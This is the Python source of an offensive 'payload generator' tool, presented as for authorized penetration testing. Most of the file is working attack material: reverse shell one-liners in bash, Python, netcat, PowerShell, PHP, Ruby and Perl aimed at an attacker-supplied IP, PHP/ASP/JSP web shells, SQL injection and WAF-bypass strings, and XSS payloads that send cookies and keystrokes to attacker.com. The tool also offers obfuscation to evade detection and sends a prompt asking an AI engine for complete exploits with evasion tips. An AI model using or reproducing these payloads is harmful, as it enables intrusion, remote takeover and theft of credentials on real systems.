"""
AI-Powered Payload Generator
"""

from rich.console import Console
from rich.panel import Panel
from rich.syntax import Syntax

console = Console()

class PayloadGenerator:
    """Generate various payloads for authorized penetration testing."""
    
    def __init__(self):
        self.payloads = {}
    
    def generate(self, payload_type, options=None):
        """Generate payload based on type."""
        
        payload = None
        if payload_type == 1:  # Reverse Shell
            payload = self._generate_reverse_shell(options)
        elif payload_type == 2:  # Web Shell
            payload = self._generate_web_shell(options)
        elif payload_type == 3:  # SQL Injection
            payload = self._generate_sqli_payloads(options)
        elif payload_type == 4:  # XSS
            payload = self._generate_xss_payloads(options)
        elif payload_type == 5:  # Custom (AI)
            payload = self._generate_custom_ai(options)
            
        return payload

    def _obfuscate_if_requested(self, code, language):
        """Apply obfuscation if requested."""
        from rich.prompt import Confirm
        if Confirm.ask("[bold yellow]Do you want to obfuscate this payload? (Anti-Evasion)[/bold yellow]"):
            from modules.exploit.obfuscator import Obfuscator
            obf = Obfuscator()
            return obf.obfuscate(code, language)
        return code
    
    def _generate_reverse_shell(self, options=None):
        """Generate reverse shell payloads."""
        
        from rich.prompt import Prompt
        
        ip = Prompt.ask("[cyan]Attacker IP[/cyan]", default="127.0.0.1")
        port = Prompt.ask("[cyan]Port[/cyan]", default="4444")
        
        payloads = f"""
[bold red]ğŸ’€ Reverse Shell Payloads[/bold red]
[dim]Target: {ip}:{port}[/dim]

[bold cyan]â”â”â” Bash â”â”â”[/bold cyan]
[green]bash -i >& /dev/tcp/{ip}/{port} 0>&1[/green]

[bold cyan]â”â”â” Bash (alternative) â”â”â”[/bold cyan]
[green]bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'[/green]

[bold cyan]â”â”â” Python â”â”â”[/bold cyan]
[green]python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'[/green]

[bold cyan]â”â”â” Python (Windows) â”â”â”[/bold cyan]
[green]python -c "import socket,subprocess;s=socket.socket();s.connect(('{ip}',{port}));subprocess.call(['cmd'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())"[/green]

[bold cyan]â”â”â” Netcat â”â”â”[/bold cyan]
[green]nc -e /bin/sh {ip} {port}[/green]
[green]rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f[/green]

[bold cyan]â”â”â” PowerShell â”â”â”[/bold cyan]
[green]powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}"[/green]

[bold cyan]â”â”â” PHP â”â”â”[/bold cyan]
[green]php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'[/green]

[bold cyan]â”â”â” Ruby â”â”â”[/bold cyan]
[green]ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'[/green]

[bold cyan]â”â”â” Perl â”â”â”[/bold cyan]
[green]perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'[/green]

[bold yellow]â”â”â” Listener Setup â”â”â”[/bold yellow]
[white]nc -lvnp {port}[/white]
[white]rlwrap nc -lvnp {port}  # with readline support[/white]

[bold red]âš ï¸  For authorized testing only![/bold red]
"""
        return payloads
    
    def _generate_web_shell(self, options=None):
        """Generate web shell payloads."""
        
        payloads = """
[bold red]ğŸŒ Web Shell Payloads[/bold red]

[bold cyan]â”â”â” PHP Simple â”â”â”[/bold cyan]
[green]<?php system($_GET['cmd']); ?>[/green]
[dim]Usage: shell.php?cmd=whoami[/dim]

[bold cyan]â”â”â” PHP Stealthy â”â”â”[/bold cyan]
[green]<?=`$_GET[0]`?>[/green]
[dim]Usage: s.php?0=id[/dim]

[bold cyan]â”â”â” PHP Full Featured â”â”â”[/bold cyan]
[green]<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>[/green]

[bold cyan]â”â”â” ASP Classic â”â”â”[/bold cyan]
[green]<%
Set oScript = Server.CreateObject("WSCRIPT.SHELL")
Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
szCMD = request("cmd")
szTempFile = "c:\\\\temp\\\\cmd.txt"
Call oScript.Run ("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
Set oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)
Response.Write "<pre>" & oFile.ReadAll & "</pre>"
%>[/green]

[bold cyan]â”â”â” JSP â”â”â”[/bold cyan]
[green]<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
String output = "";
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream is = p.getInputStream();
    DataInputStream dis = new DataInputStream(is);
    String dirone = dis.readLine();
    while ( dirone != null ) {
        output += dirone;
        dirone = dis.readLine();
    }
}
%>
<%=output%>[/green]

[bold red]âš ï¸  For authorized testing only![/bold red]
"""
        return payloads
    
    def _generate_sqli_payloads(self, options=None):
        """Generate SQL injection payloads."""
        
        payloads = """
[bold red]ğŸ’‰ SQL Injection Payloads[/bold red]

[bold cyan]â”â”â” Authentication Bypass â”â”â”[/bold cyan]
[green]' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
' OR 1=1--
admin'--
') OR ('1'='1
') OR ('1'='1'--[/green]

[bold cyan]â”â”â” UNION Based â”â”â”[/bold cyan]
[green]' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--[/green]

[bold cyan]â”â”â” Error Based â”â”â”[/bold cyan]
[green]' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND extractvalue(1,concat(0x7e,(SELECT version()),0x7e))--
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--[/green]

[bold cyan]â”â”â” Time Based Blind â”â”â”[/bold cyan]
[green]' AND SLEEP(5)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
'; WAITFOR DELAY '0:0:5'--
' AND BENCHMARK(10000000,MD5('test'))--[/green]

[bold cyan]â”â”â” Boolean Blind â”â”â”[/bold cyan]
[green]' AND 1=1--
' AND 1=2--
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--[/green]

[bold cyan]â”â”â” Stacked Queries â”â”â”[/bold cyan]
[green]'; DROP TABLE users;--
'; INSERT INTO users VALUES('hacker','password');--
'; UPDATE users SET password='hacked' WHERE username='admin';--[/green]

[bold cyan]â”â”â” WAF Bypass â”â”â”[/bold cyan]
[green]' OR '1'='1' #
' /*!50000OR*/ '1'='1'
' /**/ OR /**/ '1'='1'
' OR 0x31=0x31
' UNION/**/SELECT/**/NULL,NULL--[/green]

[bold red]âš ï¸  For authorized testing only![/bold red]
"""
        return payloads
    
    def _generate_xss_payloads(self, options=None):
        """Generate XSS payloads."""
        
        payloads = """
[bold red]âš¡ XSS Payloads[/bold red]

[bold cyan]â”â”â” Basic Reflected â”â”â”[/bold cyan]
[green]<script>alert('XSS')</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>[/green]

[bold cyan]â”â”â” Event Handlers â”â”â”[/bold cyan]
[green]<img src=x onerror="alert('XSS')">
<div onmouseover="alert('XSS')">Hover me</div>
<input onfocus=alert('XSS') autofocus>
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>[/green]

[bold cyan]â”â”â” Filter Bypass â”â”â”[/bold cyan]
[green]<ScRiPt>alert('XSS')</sCrIpT>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert&#40;'XSS'&#41;>
<svg/onload=alert('XSS')>
<<script>alert('XSS');//<</script>[/green]

[bold cyan]â”â”â” Cookie Stealing â”â”â”[/bold cyan]
[green]<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
<script>new Image().src="http://attacker.com/?c="+encodeURIComponent(document.cookie);</script>[/green]

[bold cyan]â”â”â” Keylogger â”â”â”[/bold cyan]
[green]<script>document.onkeypress=function(e){fetch('http://attacker.com/log?k='+e.key)}</script>[/green]

[bold cyan]â”â”â” DOM Based â”â”â”[/bold cyan]
[green]#<script>alert('XSS')</script>
javascript:alert('XSS')
"><script>alert('XSS')</script>
'-alert('XSS')-'[/green]

[bold cyan]â”â”â” Polyglot â”â”â”[/bold cyan]
[green]jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcLiCk=alert() )//[/green]

[bold red]âš ï¸  For authorized testing only![/bold red]
"""
        return payloads
    
    def _generate_custom_ai(self, options=None):
        """Generate custom payload using AI."""
        
        from rich.prompt import Prompt
        from core.ai_engine import AIEngine
        
        console.print("\n[bold cyan]ğŸ¤– AI Custom Payload Generator[/bold cyan]\n")
        
        description = Prompt.ask("[cyan]Describe the payload you need[/cyan]")
        
        if not description:
            return None
        
        ai = AIEngine()
        
        prompt = f"""Generate a custom exploit payload for authorized penetration testing.

Requirements: {description}

Provide:
1. Complete, working payload code
2. Explanation of how it works
3. Usage instructions
4. Detection evasion tips if applicable

Be specific and technical. This is for authorized security testing."""
        
        console.print("\n[dim]ğŸ¤– Generating custom payload...[/dim]\n")
        
        response = ai.chat(prompt)
        
        return response
